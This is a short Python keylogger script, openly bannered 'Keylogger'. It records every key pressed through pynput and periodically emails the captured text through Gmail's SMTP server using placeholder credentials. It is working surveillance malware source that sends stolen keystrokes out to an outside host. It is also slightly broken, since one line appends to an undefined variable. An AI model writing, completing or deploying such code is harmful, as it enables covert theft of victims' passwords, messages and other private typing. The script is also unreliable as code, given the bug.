import smtplib
from pynput.keyboard import Key, Listener

print ('''
 _   __           _                             
| | / /          | |                            
| |/ /  ___ _   _| | ___   __ _  __ _  ___ _ __ 
|    \ / _ \ | | | |/ _ \ / _` |/ _` |/ _ \ '__|
| |\  \  __/ |_| | | (_) | (_| | (_| |  __/ |   
\_| \_/\___|\__, |_|\___/ \__, |\__, |\___|_|   
             __/ |         __/ | __/ |          
            |___/         |___/ |___/           
''')


email = "email"
password = "password"

server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(email,password)
print("logged in")


full_words = ""
words = ""
word_limit = 50

def get_press(key):
    global words
    global full_words
    global email
    global word_limit

    if key == Key.space or key == Key.enter:
        words += ' '
        full_words += words
        words = ' '

        if len(full_words) >= word_limit:
            send_email()
            full_words = ""
    
    elif key == Key.shift_l or key == Key.shift_r:
        return
    elif key == Key.backspace:
        words = words[:-1]
    else:
        character = f'{key}'
        character = character[1:-1]
        word +=character
    if key == Key.esc:
        return False
    
def send_email():

    server.sendmail(
        email,
        email,
        full_words
        )
       
with Listener( on_press=get_press ) as listener:
    listener.join()
